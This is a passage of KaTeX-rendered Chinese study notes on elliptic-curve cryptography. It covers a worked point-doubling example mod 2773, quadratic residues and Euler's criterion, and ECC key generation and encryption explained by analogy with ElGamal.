style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span></span></span></span></p><p>6的逆为-462，即2311, 则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mn>2312</mn></mrow><annotation encoding="application/x-tex">\alpha = 2312</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mord">1</span><span class="mord">2</span></span></span></span>。</p><p>ok，然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mi>α</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mi>p</mi></msub><mo>−</mo><msub><mi>x</mi><mi>p</mi></msub><mo>=</mo><mn>1771</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_R=\alpha^2-x_p-x_p=1771\ (mod\ 2773)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mord">7</span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mi>α</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>R</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mn>705</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y_R=\alpha(x_P-x_R)-y_R=705\ (mod\ 2773)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7</span><span class="mord">0</span><span class="mord">5</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></p><h3 id="二次剩余定义-2"><a class="markdownIt-Anchor" href="#二次剩余定义-2"></a> 二次剩余定义</h3><p><img src="https://upyun.wuuconix.link/image-20211017231128273.png" alt="二次剩余" /></p><p><img src="https://upyun.wuuconix.link/image-20211017231142717.png" alt="欧拉判别法" /></p><p>当我们判断d是p的二次剩余后，去求解x的时候，如果p是一个模4余3的素数，那么x就可以直接给出结果</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mo>±</mo><msup><mi>d</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x=\pm d^{(p-1)/4} \ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0824399999999998em;vertical-align:-0.19444em;"></span><span class="mord">±</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></p><p><img src="https://upyun.wuuconix.link/image-20211017231949987.png" alt="模4余三" /></p><h3 id="ecc中的离散对数dlp问题-2"><a class="markdownIt-Anchor" href="#ecc中的离散对数dlp问题-2"></a> ECC中的离散对数DLP问题</h3><p><img src="https://upyun.wuuconix.link/image-20211017232337114.png" alt="ECC DLP" /></p><p>在椭圆曲线群中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo>×</mo><mi>α</mi></mrow><annotation encoding="application/x-tex">k\times\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>，对应<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>α</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">\alpha ^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span>。</p><p>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">Z_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>下求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>很难，在椭圆曲线中也很难求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span>，便以此为依据设计了一个陷门函数，形成了ECC。</p><h3 id="密钥生成-2"><a class="markdownIt-Anchor" href="#密钥生成-2"></a> 密钥生成</h3><ol><li><p>选择一个椭圆曲线E(mod p)，p是一个大素数。</p></li><li><p>选择E上的点G，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>×</mo><mi>G</mi><mo>=</mo><mi>O</mi></mrow><annotation encoding="application/x-tex">n\times G=O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span></p></li><li><p>选择随机数a, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>&lt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">a&lt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span></p></li><li><p>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>A</mi></msub><mo>=</mo><mi>a</mi><mo>×</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">P_A=a\times G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">G</span></span></span></span>。</p></li></ol><p>公钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>G</mi><mo separator="true">,</mo><msub><mi>P</mi><mi>A</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p, G, P_A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，私钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>。</p><p>和Elgmal完全一致。</p><h3 id="加密过程-3"><a class="markdownIt-Anchor" href="#加密过程-3"></a> 加密过程</h3><p>假设需要加密的信息为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">P_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。和Elgmal一样，会加密出来一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">C_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>k</mi><mi>G</mi></mrow><annotation encoding="application/x-tex">C_1=kG</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">G</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><msub><mi>P</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">C_2=P_m+kP_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>我们发现实际上就是把Elgmal的乘号变成加号，幂变成乘号，就能从Elgmal类推出ECC。这里值得注意的是，我们的信息<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">P_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是一个点，实际上<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">C_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>也是点，里面有横坐标和纵坐标两个信息。</p><h3 id="解密过程-3"><a class="markdownIt-Anchor" href="#解密过程-3"></a> 解密过程</h3><p>Elgmal的解密是这样的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">m=c_2*((c_1)^a)^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 